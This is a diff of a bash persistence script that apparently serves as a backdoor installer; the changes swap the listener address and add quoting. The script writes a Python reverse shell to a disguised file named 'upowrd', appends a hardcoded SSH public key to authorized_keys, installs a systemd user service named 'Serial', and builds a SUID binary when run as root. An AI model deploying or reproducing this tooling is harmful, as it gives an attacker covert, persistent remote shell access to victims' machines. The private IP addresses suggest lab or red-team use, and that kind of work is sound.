@@ -1,13 +1,13 @@
 #!/bin/bash
 
 PUBKEY="ssh-rsa AAAADAQABAAABAQKIPelAdy/6YG8zWMc1YZXYf9boIZz2v48aq9BSVr3vBMhUj02Du6TZ2BMckLqGa4lqCIkfTlZ4Zk"
-LHOST="10.0.2.2"
+LHOST="192.168.122.1"
 PORT="4242"
 
 function reverse_shells(){
 echo "[+] installing reverse shells executable"
 
-cat << EOF > ${REVSHELLSPATH}
+cat << EOF > "${REVSHELLSPATH}"
 #!/bin/bash
 if command -v python > /dev/null 2>&1; then
         python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$LHOST",$PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
@@ -29,14 +29,14 @@ if command -v sh > /dev/null 2>&1; then
         exit;
 fi
 EOF
-chmod +x ${REVSHELLSPATH}
+chmod +x "${REVSHELLSPATH}"
 }
 
 function add_key(){
 
 	echo "[+] adding ssh key"
-	if [ ! -f $HOME/.ssh/authorized_keys ];then mkdir $HOME/.ssh ;fi
-	echo $PUBKEY >> $HOME/.ssh/authorized_keys;
+	if [ ! -f "$HOME"/.ssh/authorized_keys ];then mkdir "$HOME"/.ssh ;fi
+	echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys;
 
 }
 
@@ -46,9 +46,9 @@ if ! command -v systemctl &> /dev/null; then
 fi
 
 echo "[+] installing systemd timer for user $USER"
-mkdir -p $HOME/.config/systemd/user/
+mkdir -p "$HOME"/.config/systemd/user/
 
-cat << EOF > $HOME/.config/systemd/user/serial.service
+cat << EOF > "$HOME"/.config/systemd/user/serial.service
 [Unit]
 Description=Serial
 
@@ -155,7 +155,7 @@ if [ "$EUID" -eq 0 ]; then
 	make_suid_bin
 fi
 echo "Adding persistences to $USER..."
-mkdir -p $HOME/.local/share 2>/dev/null
+mkdir -p "$HOME"/.local/share 2>/dev/null
 REVSHELLSPATH="$HOME/.local/share/upowrd"
 reverse_shells
 install_user_systemd
